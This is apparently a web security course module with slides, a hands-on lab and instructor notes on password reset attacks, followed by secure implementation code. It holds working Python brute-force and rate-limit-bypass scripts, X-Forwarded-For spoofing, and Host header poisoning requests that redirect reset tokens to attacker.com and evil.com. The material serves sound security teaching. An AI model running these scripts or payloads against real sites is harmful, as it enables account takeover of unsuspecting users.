# Day 2 - Module 3: Password Reset Attacks

**Duration:** 1.5 hours
**Prerequisites:** Day 1 completed

---

## Slide 1: Password Reset - A Critical Attack Vector

### Why Password Reset Matters

**Statistics:**
- 60% of users forget passwords regularly
- Password reset is one of the most attacked features
- Often implemented as an afterthought
- Direct path to account takeover

### Common Password Reset Flows

**Flow 1: Email Token**
```
1. User requests password reset
2. System generates unique token
3. Token sent via email
4. User clicks link with token
5. System validates token
6. User sets new password
```

**Flow 2: Security Questions**
```
1. User provides username/email
2. System shows security questions
3. User answers questions
4. System validates answers
5. User sets new password
```

**Flow 3: SMS/OTP**
```
1. User requests reset
2. System sends OTP via SMS
3. User enters OTP code
4. System validates OTP
5. User sets new password
```

### Attack Surface

Every step is a potential vulnerability:
- Token generation (predictability)
- Token storage (security)
- Token validation (implementation flaws)
- Rate limiting (brute-force protection)
- Host header trust (manipulation)

---

## Slide 2: Cookie Swap Attacks

### What is a Cookie Swap Attack?

Exploiting the password reset flow by manipulating cookies to reset another user's password.

### Attack Scenario

**Vulnerable Flow:**
```
1. Attacker requests password reset for victim@example.com
2. Server generates reset token
3. Server stores: reset_token=abc123 in attacker's session
4. Email sent to victim@example.com with reset link
5. Attacker swaps session cookie to victim's active session
6. Attacker completes reset using victim's session
7. Victim's password is changed to attacker's chosen password
```

### Technical Details

**Step-by-Step Exploitation:**

**Step 1: Initiate Reset for Victim**
```http
POST /password-reset HTTP/1.1
Host: vulnerable.com
Cookie: sessionid=attacker-session-123

email=victim@example.com
```

**Step 2: Server Response**
```http
HTTP/1.1 200 OK
Set-Cookie: reset_token=abc123; Path=/reset

Reset link sent to victim@example.com
```

**Step 3: Capture Victim's Session**
```javascript
// Via XSS, session fixation, or other means
// Attacker obtains: sessionid=victim-session-xyz
```

**Step 4: Swap Cookies**
```http
GET /reset-password?token=abc123 HTTP/1.1
Host: vulnerable.com
Cookie: sessionid=victim-session-xyz; reset_token=abc123

# Server associates reset with victim's session
# Allows password change for victim's account
```

### Variations

**Variation 1: Cookie Ordering**
```http
# Some applications check first cookie only
Cookie: reset_user=victim@example.com; reset_user=attacker@example.com
```

**Variation 2: Cookie Domain Manipulation**
```http
# Set cookie for parent domain
Cookie: reset_token=abc123; Domain=.example.com
```

### Testing Methodology

```python
import requests

# Step 1: Initiate reset for victim
session_attacker = requests.Session()
session_attacker.post('https://target.com/password-reset',
                      data={'email': 'victim@example.com'})

# Capture reset token from attacker's session
reset_token = session_attacker.cookies.get('reset_token')

# Step 2: Create victim's session
session_victim = requests.Session()
session_victim.get('https://target.com/login')  # Establish session

# Step 3: Swap cookies
session_victim.cookies.set('reset_token', reset_token)

# Step 4: Complete reset
response = session_victim.post('https://target.com/set-new-password',
                               data={'password': 'hacked123'})

if response.status_code == 200:
    print("Password reset successful - VULNERABLE!")
```

---

## Slide 3: Host Header Validation Bypass

### Understanding Host Header Attacks

The `Host` header tells the server which domain the request is for. If improperly validated, it can be exploited.

### Attack Vector: Password Reset Poisoning

**Scenario:**
```http
POST /password-reset HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

**Vulnerable Server Behavior:**
```python
# Server generates reset link
reset_link = f"https://{request.headers['Host']}/reset?token=abc123"

# Email sent to victim
send_email(
    to="victim@example.com",
    subject="Password Reset",
    body=f"Click here to reset: {reset_link}"
)

# Email contains: https://attacker.com/reset?token=abc123
# Victim clicks → token sent to attacker!
```

### Host Header Manipulation Techniques

**Technique 1: Direct Host Override**
```http
POST /password-reset HTTP/1.1
Host: attacker.com

email=victim@example.com
```

**Technique 2: X-Forwarded-Host Header**
```http
POST /password-reset HTTP/1.1
Host: legitimate.com
X-Forwarded-Host: attacker.com

email=victim@example.com
```

**Technique 3: Absolute URL in Request Line**
```http
POST https://attacker.com/password-reset HTTP/1.1
Host: legitimate.com

email=victim@example.com
```

**Technique 4: Multiple Host Headers**
```http
POST /password-reset HTTP/1.1
Host: legitimate.com
Host: attacker.com

email=victim@example.com
```

**Technique 5: Host Header Injection**
```http
POST /password-reset HTTP/1.1
Host: legitimate.com:@attacker.com

email=victim@example.com
```

### Testing for Host Header Vulnerabilities

```bash
# Test with Burp Suite Collaborator
POST /password-reset HTTP/1.1
Host: burpcollaborator.net

# Check if Burp Collaborator receives DNS/HTTP requests
# Indicates vulnerable to host header injection

# Test with your own server
POST /password-reset HTTP/1.1
Host: yourdomain.com

# Monitor logs for incoming requests with reset tokens
```

### Real-World Example

**Uber Password Reset Vulnerability (2017)**
```http
POST /api/v1/password/reset HTTP/1.1
Host: evil.com
X-Forwarded-Host: evil.com

{"email": "victim@uber.com"}

# Reset link sent:
# https://evil.com/reset?token=secret-token
# Attacker intercepts token when victim clicks
```

---

## Slide 4: IP-Based Brute Force Protections Bypass

### Rate Limiting Overview

**Purpose:** Prevent attackers from brute-forcing reset tokens or security questions.

**Common Implementations:**
```python
# IP-based rate limiting
if request_count[client_ip] > MAX_REQUESTS_PER_HOUR:
    return "Too many requests"

# Account-based rate limiting
if reset_attempts[email] > MAX_ATTEMPTS:
    return "Account locked"

# Token-based rate limiting
if token_attempts[reset_token] > MAX_TRIES:
    return "Token invalidated"
```

### Bypass Technique 1: IP Header Manipulation

**X-Forwarded-For Header Spoofing**
```http
POST /password-reset HTTP/1.1
Host: target.com
X-Forwarded-For: 1.2.3.4

email=victim@example.com

# Next request
POST /password-reset HTTP/1.1
Host: target.com
X-Forwarded-For: 1.2.3.5  # Different IP

email=victim@example.com
```

**Other Headers to Try:**
```http
X-Forwarded-For: random.random.random.random
X-Forwarded-Host: random.com
X-Originating-IP: random.random.random.random
X-Remote-IP: random.random.random.random
X-Remote-Addr: random.random.random.random
X-Client-IP: random.random.random.random
X-Real-IP: random.random.random.random
CF-Connecting-IP: random.random.random.random (Cloudflare)
True-Client-IP: random.random.random.random (Akamai)
```

### Bypass Technique 2: Parameter Manipulation

**Adding Random Parameters**
```http
POST /password-reset?random=1 HTTP/1.1
email=victim@example.com

POST /password-reset?random=2 HTTP/1.1
email=victim@example.com

# Server may treat these as different endpoints
```

**Case Variation**
```http
POST /Password-Reset HTTP/1.1
POST /password-reset HTTP/1.1
POST /PASSWORD-RESET HTTP/1.1

# Some frameworks treat these as different routes
```

### Bypass Technique 3: Race Conditions

**Parallel Requests**
```python
import concurrent.futures
import requests

def send_reset(email):
    return requests.post('https://target.com/password-reset',
                        data={'email': email})

# Send 100 requests simultaneously
with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    futures = [executor.submit(send_reset, 'victim@example.com')
              for _ in range(100)]

# Rate limiting may not catch all requests if they arrive simultaneously
```

### Bypass Technique 4: User Agent Rotation

```python
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)...',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...',
    'Mozilla/5.0 (X11; Linux x86_64)...',
    # ... more user agents
]

for ua in user_agents:
    requests.post('https://target.com/password-reset',
                 headers={'User-Agent': ua},
                 data={'email': 'victim@example.com'})
```

### Bypass Technique 5: Character Encoding

```http
POST /password-reset HTTP/1.1

email=victim@example.com

# Try variations
email=victim%40example.com
email=victim%2540example.com (double encoding)
email=victim@example。com (Unicode dot)
```

### Token Brute-Force Attack

**Scenario:** 4-digit PIN sent via SMS

```python
import requests

email = 'victim@example.com'

# Request reset
requests.post('https://target.com/password-reset', data={'email': email})

# Brute-force PIN
for pin in range(10000):
    pin_str = f"{pin:04d}"

    # Bypass rate limiting with headers
    headers = {
        'X-Forwarded-For': f'10.0.{pin // 256}.{pin % 256}'
    }

    response = requests.post('https://target.com/verify-reset',
                           headers=headers,
                           data={'email': email, 'pin': pin_str})

    if response.status_code == 200:
        print(f"Valid PIN: {pin_str}")
        break
```

---

## Slide 5: Advanced Password Reset Vulnerabilities

### Vulnerability 1: Token Leakage via Referer

**Attack Flow:**
```http
# Reset email contains:
https://target.com/reset?token=secret123

# Page contains:
<a href="https://analytics.com/track">
<img src="https://ads.com/pixel.gif">

# When user visits reset page:
GET /track HTTP/1.1
Host: analytics.com
Referer: https://target.com/reset?token=secret123

# Token leaked to third-party!
```

**Testing:**
```bash
# Check if reset page loads external resources
curl -s https://target.com/reset?token=test | \
  grep -E '(src|href)="https?://(?!target\.com)'
```

### Vulnerability 2: Token Not Invalidated After Use

```python
# Test: Use same token multiple times
token = "abc123"

# Use token once
requests.post('https://target.com/reset-password',
             data={'token': token, 'password': 'newpass1'})

# Try using again
response = requests.post('https://target.com/reset-password',
                        data={'token': token, 'password': 'newpass2'})

if response.status_code == 200:
    print("Token reusable - VULNERABLE!")
```

### Vulnerability 3: Predictable Tokens

```python
# Analyze token generation
tokens = []
for i in range(100):
    resp = requests.post('https://target.com/password-reset',
                        data={'email': f'test{i}@example.com'})
    # Extract token from email/response
    tokens.append(extract_token(resp))

# Analyze for patterns
# - Sequential numbers
# - Timestamp-based
# - Weak random generation
# - Insufficient entropy
```

### Vulnerability 4: Token Expiration Not Enforced

```python
# Generate token
response = requests.post('https://target.com/password-reset',
                        data={'email': 'test@example.com'})
token = extract_token(response)

# Wait beyond expiration time (e.g., 24 hours)
time.sleep(86400 + 60)

# Try using expired token
response = requests.post('https://target.com/reset-password',
                        data={'token': token, 'password': 'newpass'})

if response.status_code == 200:
    print("Expiration not enforced - VULNERABLE!")
```

### Vulnerability 5: No Token Validation

```python
# Try accessing reset page without token
response = requests.get('https://target.com/reset-password')

# Try with arbitrary token
response = requests.post('https://target.com/reset-password',
                        data={'token': 'invalidtoken123',
                              'password': 'newpass'})

# Check if password changed without valid token
```

### Vulnerability 6: Mass Assignment

```http
POST /password-reset HTTP/1.1
Content-Type: application/json

{
  "email": "attacker@example.com",
  "target_email": "victim@example.com"
}

# Or

{
  "email": "victim@example.com",
  "user_id": "admin_user_id"
}
```

---

## Slide 6: Lab 3 - Password Reset Exploitation

### Lab Environment

**Target:** `https://lab3.webapp-training.local`

**Test Accounts:**
- `user1@lab.local:password123`
- `user2@lab.local:password456`

**Objectives:**
1. Exploit cookie swap vulnerability
2. Bypass host header validation
3. Circumvent rate limiting
4. Document findings

### Part 1: Cookie Swap Attack (30 min)

**Task 1: Understand the Flow**
```bash
# Step 1: Request reset for victim
curl -c cookies1.txt -X POST \
  https://lab3.webapp-training.local/password-reset \
  -d "email=user2@lab.local"

# Observe cookies set
cat cookies1.txt

# Step 2: Login as victim (simulate obtaining victim session)
curl -c cookies2.txt -X POST \
  https://lab3.webapp-training.local/login \
  -d "email=user2@lab.local&password=password456"

# Step 3: Extract reset token from cookies1
# Step 4: Combine with victim's session from cookies2
# Step 5: Complete password reset
```

**Task 2: Exploitation with Burp**
```
1. Intercept password reset request for victim
2. Note the reset_token cookie
3. In separate browser, login as victim
4. Copy victim's session cookie
5. In Burp, modify reset request:
   - Use victim's session cookie
   - Keep attacker's reset token
6. Complete password reset
7. Verify you can login as victim with new password
```

### Part 2: Host Header Attack (30 min)

**Task 1: Basic Host Override**
```http
POST /password-reset HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=user2@lab.local
```

**Task 2: Monitor Email**
```bash
# Access mailcatcher interface
# Check if reset link points to attacker.com
# If yes, extract token when "victim" clicks link
```

**Task 3: Try Header Variations**
```http
# Test X-Forwarded-Host
X-Forwarded-Host: attacker.com

# Test X-Original-URL
X-Original-URL: https://attacker.com/reset

# Test multiple Host headers
Host: lab3.webapp-training.local
Host: attacker.com
```

### Part 3: Rate Limiting Bypass (30 min)

**Task 1: Identify Rate Limit**
```python
import requests

# Send requests until rate limited
for i in range(100):
    response = requests.post(
        'https://lab3.webapp-training.local/password-reset',
        data={'email': 'user2@lab.local'}
    )
    print(f"Request {i}: Status {response.status_code}")

    if response.status_code == 429:
        print(f"Rate limited after {i} requests")
        break
```

**Task 2: Bypass with Headers**
```python
import requests

for i in range(100):
    # Rotate X-Forwarded-For
    headers = {
        'X-Forwarded-For': f'10.0.{i // 256}.{i % 256}'
    }

    response = requests.post(
        'https://lab3.webapp-training.local/password-reset',
        headers=headers,
        data={'email': 'user2@lab.local'}
    )

    print(f"Request {i}: Status {response.status_code}")
```

**Task 3: Token Brute-Force**
```python
# If tokens are short (e.g., 4-6 digits)
import requests

email = 'user2@lab.local'

# Request reset
requests.post('https://lab3.webapp-training.local/password-reset',
             data={'email': email})

# Brute-force token (assuming 4-digit PIN)
for pin in range(10000):
    headers = {'X-Forwarded-For': f'10.0.{pin // 256}.{pin % 256}'}

    response = requests.post(
        'https://lab3.webapp-training.local/verify-reset-token',
        headers=headers,
        data={'email': email, 'token': f'{pin:04d}'}
    )

    if "success" in response.text.lower():
        print(f"Valid token: {pin:04d}")
        break
```

### Deliverables

1. **Cookie Swap PoC:**
   - Screenshots showing successful password change
   - HTTP requests demonstrating the attack
   - Explanation of vulnerability

2. **Host Header Bypass:**
   - Evidence of host header manipulation
   - Captured reset token
   - Impact assessment

3. **Rate Limiting Bypass:**
   - Documented bypass technique
   - Number of requests possible before detection
   - Script or methodology used

---

## Slide 7: Real-World Case Studies

### Case Study 1: Instagram Password Reset Bypass

**Vulnerability:** No rate limiting on password reset OTP verification

**Impact:** Account takeover via brute-force

**Attack:**
- 6-digit OTP with no rate limiting
- Automated brute-force: 1,000,000 attempts possible
- Average: 500,000 attempts to find correct code

**Bounty:** $5,000

### Case Study 2: Uber Host Header Attack

**Vulnerability:** Host header used to generate password reset links

**Impact:** Mass account takeover

**Attack:**
```http
POST /api/v1/password/reset HTTP/1.1
Host: evil.com
X-Forwarded-Host: evil.com

{"email": "victim@uber.com"}
```

**Bounty:** Significant (undisclosed)

### Case Study 3: Apple iCloud Token Reuse

**Vulnerability:** Password reset tokens could be reused

**Impact:** Persistent account access

**Details:**
- Token valid for 24 hours
- Could be used multiple times
- No invalidation after first use

---

## Slide 8: Defense & Mitigation

### Secure Password Reset Implementation

**Token Generation:**
```python
import secrets
import hashlib
import time

def generate_reset_token():
    # Use cryptographically secure random
    random_bytes = secrets.token_bytes(32)

    # Add timestamp and user-specific data
    timestamp = str(time.time())
    data = random_bytes + timestamp.encode()

    # Hash for additional security
    token = hashlib.sha256(data).hexdigest()

    return token
```

**Token Storage:**
```python
# Store hashed token in database
hashed_token = hashlib.sha256(token.encode()).hexdigest()

# Store with metadata
db.store({
    'user_id': user_id,
    'token_hash': hashed_token,
    'created_at': datetime.now(),
    'expires_at': datetime.now() + timedelta(hours=1),
    'used': False
})
```

**Token Validation:**
```python
def validate_token(token, user_id):
    hashed = hashlib.sha256(token.encode()).hexdigest()

    record = db.get_token(hashed, user_id)

    if not record:
        return False, "Invalid token"

    if record['used']:
        return False, "Token already used"

    if datetime.now() > record['expires_at']:
        return False, "Token expired"

    # Mark as used
    db.mark_token_used(hashed)

    return True, "Valid"
```

### Host Header Protection

```python
# Whitelist allowed hosts
ALLOWED_HOSTS = ['example.com', 'www.example.com']

def validate_host(request):
    host = request.headers.get('Host', '').split(':')[0]

    if host not in ALLOWED_HOSTS:
        raise SecurityError("Invalid host header")

# Use absolute URLs from config
BASE_URL = config.get('BASE_URL')  # From environment/config
reset_link = f"{BASE_URL}/reset?token={token}"

# Never trust request headers for URL generation
```

### Rate Limiting

```python
from redis import Redis
from time import time

redis = Redis()

def check_rate_limit(email, ip):
    # Email-based limiting
    email_key = f"reset:email:{email}"
    email_count = redis.get(email_key) or 0

    if int(email_count) >= 3:  # Max 3 per hour
        return False, "Too many reset requests for this email"

    # IP-based limiting (as backup)
    ip_key = f"reset:ip:{ip}"
    ip_count = redis.get(ip_key) or 0

    if int(ip_count) >= 10:  # Max 10 per hour
        return False, "Too many requests from this IP"

    # Increment counters
    redis.incr(email_key)
    redis.expire(email_key, 3600)  # 1 hour
    redis.incr(ip_key)
    redis.expire(ip_key, 3600)

    return True, "OK"
```

### Additional Security Measures

1. **CAPTCHA on reset requests**
2. **Email notifications** when reset is requested
3. **Invalidate all sessions** when password is changed
4. **Two-factor authentication** for sensitive accounts
5. **Security questions** as additional verification
6. **Audit logging** of all reset attempts
7. **Token in POST body**, not URL (prevents leakage)

---

## Instructor Notes

### Timing Breakdown
- Slides 1-2: 20 min (Introduction, Cookie Swap)
- Slide 3: 20 min (Host Header attacks)
- Slide 4: 20 min (Rate limiting bypass)
- Slide 5: 15 min (Advanced vulnerabilities)
- Slide 6: 45 min (Hands-on lab)
- Slides 7-8: 10 min (Case studies & defense)

### Lab Environment Setup
- MailCatcher or similar to capture reset emails
- Vulnerable app with intentional flaws
- Redis for rate limiting demonstrations
- Student access to modify headers in Burp

### Common Student Issues
- Understanding cookie manipulation
- Setting up proper testing environment
- Python scripting for automation
- Recognizing when rate limiting is active

### Key Points to Emphasize
- Password reset is critical attack vector
- Small implementation flaws = full compromise
- Rate limiting is insufficient alone
- Defense in depth is essential

### Assessment Opportunities
- Can students identify vulnerable parameters?
- Do they understand the attack flow?
- Can they automate exploitation?
- Do they document findings clearly?
